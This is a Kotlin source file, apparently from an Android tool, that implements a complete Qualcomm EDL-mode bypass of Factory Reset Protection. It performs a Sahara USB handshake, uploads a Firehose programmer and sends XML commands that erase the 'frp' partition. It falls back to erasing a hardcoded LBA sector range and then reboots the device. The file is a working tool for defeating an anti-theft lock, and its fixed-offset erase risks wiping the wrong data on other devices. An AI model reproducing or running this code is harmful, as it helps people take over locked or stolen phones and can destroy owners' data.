package com.deepeye.edl

import android.content.Context
import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Qualcomm EDL (Emergency Download Mode) Engine
 * 
 * Implements complete Qualcomm FRP bypass via EDL mode:
 * 1. Sahara protocol handshake
 * 2. Firehose programmer upload
 * 3. XML-based FRP erase commands
 * 4. Device reboot
 * 
 * EDL Mode Entry:
 * - Power off device completely
 * - Hold Volume UP + Volume DOWN
 * - Connect USB cable
 * - Device appears as VID=0x05C6, PID=0x9008
 * 
 * Protocol Flow:
 * EDL Mode → Sahara HELLO → Sahara HELLO_RSP → Upload Firehose ELF
 *   → Firehose XML commands → Erase FRP → Reboot → FRP BYPASSED!
 * 
 * @author DeepEye Team
 * @since 2027.0.0 (Stage 9/10)
 */
class QcomEdlEngine(private val context: Context) {

    companion object {
        // Qualcomm EDL USB identifiers
        const val QUALCOMM_VID = 0x05C6
        const val EDL_PID      = 0x9008
        const val DIAG_PID     = 0x9091

        // Sahara protocol commands
        const val SAHARA_HELLO     = 0x01
        const val SAHARA_HELLO_RSP = 0x02
        const val SAHARA_READ_DATA = 0x03
        const val SAHARA_END_IMG   = 0x04
        const val SAHARA_DONE      = 0x05
        const val SAHARA_DONE_RSP  = 0x06
        const val SAHARA_RESET     = 0x07

        // Sahara modes
        const val MODE_IMAGE_TX   = 0x00
        const val MODE_MEMORY_DBG = 0x02
        const val MODE_COMMAND    = 0x03  // Command mode (no programmer needed)
    }

    /**
     * Complete EDL FRP bypass flow
     * 
     * Orchestrates the entire EDL process:
     * 1. Verify EDL device (VID/PID check)
     * 2. Sahara handshake
     * 3. Upload Firehose programmer (if available)
     * 4. Erase FRP partition via Firehose XML
     * 5. Reboot device
     * 
     * @param device USB device (must be in EDL mode)
     * @param usbManager USB manager for connection
     * @param onLog Logging callback
     * @return true if FRP bypass successful
     */
    suspend fun bypassFrpEdl(
        device: UsbDevice,
        usbManager: UsbManager,
        onLog: (String) -> Unit
    ): Boolean = withContext(Dispatchers.IO) {
        onLog("🔵 Qualcomm EDL Mode FRP Bypass")
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        // Verify EDL device
        onLog("🔍 VID=0x${device.vendorId.toString(16).uppercase()} PID=0x${device.productId.toString(16).uppercase()}")
        if (device.vendorId != QUALCOMM_VID || device.productId != EDL_PID) {
            onLog("❌ Not a Qualcomm EDL device!")
            onLog("   Expected: VID=0x05C6, PID=0x9008")
            onLog("   Got: VID=0x${device.vendorId.toString(16)}, PID=0x${device.productId.toString(16)}")
            onLog("💡 Power off → Hold Vol+ + Vol- → Connect USB for EDL")
            return@withContext false
        }
        onLog("✅ Qualcomm EDL device detected!")

        // Open USB connection
        val conn = usbManager.openDevice(device)
            ?: run {
                onLog("❌ USB open failed — allow permission first")
                return@withContext false
            }

        val intf = device.getInterface(0)
        if (!conn.claimInterface(intf, true)) {
            onLog("❌ Failed to claim USB interface")
            conn.close()
            return@withContext false
        }

        // Find endpoints
        var epOut: UsbEndpoint? = null
        var epIn: UsbEndpoint? = null
        for (i in 0 until intf.endpointCount) {
            val ep = intf.getEndpoint(i)
            if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
            else epIn = ep
        }

        if (epOut == null || epIn == null) {
            onLog("❌ USB endpoints not found")
            conn.close()
            return@withContext false
        }

        onLog("✅ USB connection established")
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        // Sahara handshake
        onLog("📡 Step 1: Sahara handshake...")
        if (!saharaHandshake(conn, epOut, epIn, onLog)) {
            onLog("❌ Sahara handshake failed")
            conn.close()
            return@withContext false
        }

        // Try to load Firehose programmer
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        onLog("📦 Step 2: Loading Firehose programmer...")
        val firehoseBytes = try {
            context.assets.open("programmers/prog_firehose_ddr.elf").readBytes()
        } catch (e: Exception) {
            onLog("⚠️ Firehose ELF not found in assets")
            onLog("💡 Add prog_firehose_ddr.elf to app/src/main/assets/programmers/")
            null
        }

        if (firehoseBytes != null) {
            // Upload Firehose programmer
            onLog("📤 Uploading Firehose (${firehoseBytes.size / 1024}KB)...")
            if (!uploadFirehose(conn, epOut, epIn, firehoseBytes, onLog)) {
                onLog("❌ Firehose upload failed")
                conn.close()
                return@withContext false
            }

            onLog("⏳ Firehose initializing (3s)...")
            Thread.sleep(3000)
        } else {
            // Try Sahara command mode (no programmer needed for some devices)
            onLog("🔄 Trying Sahara command mode (no programmer)...")
            sendSaharaDone(conn, epOut, epIn, onLog)
            Thread.sleep(1000)
        }

        // Erase FRP via Firehose XML
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        onLog("🗑️ Step 3: Erasing FRP partition...")
        val erased = eraseFrpEdl(conn, epOut, epIn, onLog)

        if (erased) {
            onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            onLog("🎉 FRP ERASED SUCCESSFULLY!")
            onLog("🔄 Rebooting device...")
            rebootEdl(conn, epOut, epIn, onLog)
        } else {
            onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            onLog("❌ FRP erase failed")
            onLog("💡 Try manual EDL tools or check Firehose programmer")
        }

        conn.close()
        return@withContext erased
    }

    /**
     * Sahara protocol handshake
     * 
     * Device sends HELLO packet → Host responds with HELLO_RSP
     * Negotiates protocol version and transfer mode
     * 
     * @param conn USB connection
     * @param epOut USB bulk OUT endpoint
     * @param epIn USB bulk IN endpoint
     * @param onLog Logging callback
     * @return true if handshake successful
     */
    fun saharaHandshake(
        conn: UsbDeviceConnection,
        epOut: UsbEndpoint,
        epIn: UsbEndpoint,
        onLog: (String) -> Unit
    ): Boolean {
        onLog("📡 Starting Sahara handshake...")

        // Read HELLO packet from device (48 bytes)
        val helloBuf = ByteArray(48)
        val r = conn.bulkTransfer(epIn, helloBuf, 48, 5000)
        if (r < 48) {
            onLog("❌ No Sahara HELLO (got $r bytes, expected 48)")
            return false
        }

        val cmd    = readLE32(helloBuf, 0).toInt()
        val len    = readLE32(helloBuf, 4).toInt()
        val ver    = readLE32(helloBuf, 8).toInt()
        val verMin = readLE32(helloBuf, 12).toInt()
        val maxPkt = readLE32(helloBuf, 16).toInt()
        val mode   = readLE32(helloBuf, 20).toInt()

        onLog("  Cmd: 0x${cmd.toString(16).padStart(2, '0')}")
        onLog("  Ver: $ver.$verMin")
        onLog("  Mode: $mode")
        onLog("  MaxPkt: $maxPkt bytes")

        if (cmd != SAHARA_HELLO) {
            onLog("❌ Expected SAHARA_HELLO (0x01), got 0x${cmd.toString(16)}")
            return false
        }
        onLog("✅ Sahara HELLO received!")

        // Send HELLO_RSP (MODE_COMMAND for no-auth)
        val helloRsp = ByteArray(48)
        writeLE32(helloRsp, 0, SAHARA_HELLO_RSP.toLong())
        writeLE32(helloRsp, 4, 48)
        writeLE32(helloRsp, 8, ver.toLong())
        writeLE32(helloRsp, 12, verMin.toLong())
        writeLE32(helloRsp, 16, 0)     // status = OK
        writeLE32(helloRsp, 20, MODE_IMAGE_TX.toLong())

        val sent = conn.bulkTransfer(epOut, helloRsp, 48, 3000)
        if (sent < 48) {
            onLog("❌ HELLO_RSP send failed (sent $sent bytes)")
            return false
        }

        onLog("✅ Sahara handshake complete!")
        return true
    }

    /**
     * Upload Firehose programmer via Sahara protocol
     * 
     * Device requests chunks via READ_DATA commands
     * Host sends programmer data until END_IMG received
     * 
     * @param conn USB connection
     * @param epOut USB bulk OUT endpoint
     * @param epIn USB bulk IN endpoint
     * @param firehoseBytes Firehose programmer ELF binary
     * @param onLog Logging callback
     * @return true if upload successful
     */
    fun uploadFirehose(
        conn: UsbDeviceConnection,
        epOut: UsbEndpoint,
        epIn: UsbEndpoint,
        firehoseBytes: ByteArray,
        onLog: (String) -> Unit
    ): Boolean {
        onLog("📤 Uploading Firehose programmer (${firehoseBytes.size / 1024}KB)...")

        var lastOffset = 0L

        while (true) {
            // Read command from device (READ_DATA, END_IMG, or DONE_RSP)
            val buf = ByteArray(64)
            val r = conn.bulkTransfer(epIn, buf, buf.size, 10000)
            if (r < 8) {
                onLog("❌ Short read: $r bytes (expected >= 8)")
                return false
            }

            val cmd = readLE32(buf, 0).toInt()
            val len = readLE32(buf, 4).toInt()

            when (cmd) {
                SAHARA_READ_DATA -> {
                    val imgId   = readLE32(buf, 8)
                    val dataOff = readLE32(buf, 12)
                    val dataLen = readLE32(buf, 16).toInt()

                    onLog("  READ_DATA: img=$imgId off=$dataOff len=${dataLen}B")

                    // Validate offset and length
                    if (dataOff.toInt() + dataLen > firehoseBytes.size) {
                        onLog("❌ Request beyond file size!")
                        onLog("   Requested: ${dataOff.toInt() + dataLen}")
                        onLog("   File size: ${firehoseBytes.size}")
                        return false
                    }

                    // Send requested chunk
                    val chunk = firehoseBytes.copyOfRange(
                        dataOff.toInt(),
                        dataOff.toInt() + dataLen
                    )
                    val sent = conn.bulkTransfer(epOut, chunk, chunk.size, 30000)
                    if (sent < dataLen) {
                        onLog("❌ Chunk send failed (sent $sent/$dataLen)")
                        return false
                    }

                    lastOffset = dataOff.toLong() + dataLen
                    val pct = (lastOffset * 100 / firehoseBytes.size).toInt()
                    
                    if (pct % 20 == 0) {
                        onLog("  Upload: $pct% (${lastOffset / 1024}KB / ${firehoseBytes.size / 1024}KB)")
                    }
                }

                SAHARA_END_IMG -> {
                    val imgId  = readLE32(buf, 8)
                    val status = readLE32(buf, 12).toInt()
                    
                    onLog("  END_IMG: imgId=$imgId status=0x${status.toString(16).padStart(2, '0')}")
                    
                    if (status != 0) {
                        onLog("❌ Upload failed: status=0x${status.toString(16)}")
                        return false
                    }
                }

                SAHARA_DONE_RSP -> {
                    onLog("✅ Firehose upload complete!")
                    return true
                }

                else -> {
                    onLog("⚠️ Unexpected Sahara command: 0x${cmd.toString(16).padStart(2, '0')}")
                }
            }
        }
    }

    /**
     * Send Firehose XML command and receive response
     * 
     * Firehose protocol uses XML over USB bulk transfer
     * Commands: <erase>, <read>, <write>, <power>, etc.
     * 
     * @param conn USB connection
     * @param epOut USB bulk OUT endpoint
     * @param epIn USB bulk IN endpoint
     * @param xml XML command string
     * @param onLog Logging callback
     * @return XML response string
     */
    fun sendFirehoseCmd(
        conn: UsbDeviceConnection,
        epOut: UsbEndpoint,
        epIn: UsbEndpoint,
        xml: String,
        onLog: (String) -> Unit
    ): String {
        onLog("  📤 FH CMD: ${xml.take(80)}...")
        
        val xmlBytes = xml.toByteArray(Charsets.UTF_8)
        val sent = conn.bulkTransfer(epOut, xmlBytes, xmlBytes.size, 5000)
        
        if (sent < 0) {
            onLog("  ❌ XML send failed")
            return ""
        }

        // Read response
        val resp = ByteArray(4096)
        val r = conn.bulkTransfer(epIn, resp, resp.size, 10000)
        
        val respStr = if (r > 0) {
            resp.copyOf(r).toString(Charsets.UTF_8)
        } else {
            ""
        }
        
        onLog("  📥 FH RESP: ${respStr.take(100)}")
        return respStr
    }

    /**
     * Erase FRP partition via Firehose XML commands
     * 
     * Tries two methods:
     * 1. Erase by partition name ("frp")
     * 2. Erase by LBA range (fallback for unknown partition names)
     * 
     * @param conn USB connection
     * @param epOut USB bulk OUT endpoint
     * @param epIn USB bulk IN endpoint
     * @param onLog Logging callback
     * @return true if FRP erase successful
     */
    fun eraseFrpEdl(
        conn: UsbDeviceConnection,
        epOut: UsbEndpoint,
        epIn: UsbEndpoint,
        onLog: (String) -> Unit
    ): Boolean {
        onLog("🗑️ Firehose: Erasing FRP partition...")

        // Method 1: Try partition name first
        val eraseXml = """<?xml version="1.0" ?>
<data>
  <erase SECTOR_SIZE_IN_BYTES="512" label="frp" />
</data>"""
        
        var resp = sendFirehoseCmd(conn, epOut, epIn, eraseXml, onLog)

        if (resp.contains("ACK") || resp.contains("value=\"ACK\"")) {
            onLog("✅ FRP erased via Firehose (partition name)!")
            return true
        }

        // Method 2: Try by LBA range (Qualcomm FRP typically at LBA 65536)
        onLog("⚠️ Partition name failed — trying LBA erase fallback...")
        val lbaEraseXml = """<?xml version="1.0" ?>
<data>
  <erase SECTOR_SIZE_IN_BYTES="512" 
         start_sector="65536" 
         num_partition_sectors="2048" 
         physical_partition_number="0" />
</data>"""
        
        resp = sendFirehoseCmd(conn, epOut, epIn, lbaEraseXml, onLog)

        if (resp.contains("ACK") || resp.contains("value=\"ACK\"")) {
            onLog("✅ FRP LBA range erased!")
            return true
        }

        onLog("❌ Firehose FRP erase failed (both methods)")
        onLog("   Response: $resp")
        return false
    }

    /**
     * Reboot device via Firehose XML command
     * 
     * Sends <power value="reset" /> to trigger device reboot
     * 
     * @param conn USB connection
     * @param epOut USB bulk OUT endpoint
     * @param epIn USB bulk IN endpoint
     * @param onLog Logging callback
     */
    fun rebootEdl(
        conn: UsbDeviceConnection,
        epOut: UsbEndpoint,
        epIn: UsbEndpoint,
        onLog: (String) -> Unit
    ) {
        onLog("🔄 Firehose reboot command...")
        
        val xml = """<?xml version="1.0" ?><data><power value="reset" /></data>"""
        sendFirehoseCmd(conn, epOut, epIn, xml, onLog)
        
        onLog("📱 Device rebooting via Firehose!")
    }

    /**
     * Send Sahara DONE command (for no-programmer mode)
     * 
     * Some devices allow direct command mode without uploading Firehose
     * 
     * @param conn USB connection
     * @param epOut USB bulk OUT endpoint
     * @param epIn USB bulk IN endpoint
     * @param onLog Logging callback
     */
    private fun sendSaharaDone(
        conn: UsbDeviceConnection,
        epOut: UsbEndpoint,
        epIn: UsbEndpoint,
        onLog: (String) -> Unit
    ) {
        onLog("📤 Sending Sahara DONE...")
        
        val done = ByteArray(8)
        writeLE32(done, 0, SAHARA_DONE.toLong())
        writeLE32(done, 4, 8)
        
        conn.bulkTransfer(epOut, done, 8, 2000)
        
        val resp = ByteArray(8)
        conn.bulkTransfer(epIn, resp, 8, 2000)
        
        onLog("  Sahara DONE ack: 0x${resp[0].toInt().and(0xFF).toString(16)}")
    }

    // ══════════════════════════════════════════
    // LITTLE-ENDIAN 32-BIT HELPERS
    // ══════════════════════════════════════════

    /**
     * Read 32-bit little-endian value from byte array
     */
    private fun readLE32(buf: ByteArray, off: Int): Long {
        return (buf[off].toLong().and(0xFF)) or
               (buf[off + 1].toLong().and(0xFF) shl 8) or
               (buf[off + 2].toLong().and(0xFF) shl 16) or
               (buf[off + 3].toLong().and(0xFF) shl 24)
    }

    /**
     * Write 32-bit little-endian value to byte array
     */
    private fun writeLE32(buf: ByteArray, off: Int, v: Long) {
        buf[off]     = (v and 0xFF).toByte()
        buf[off + 1] = ((v shr 8) and 0xFF).toByte()
        buf[off + 2] = ((v shr 16) and 0xFF).toByte()
        buf[off + 3] = ((v shr 24) and 0xFF).toByte()
    }
}
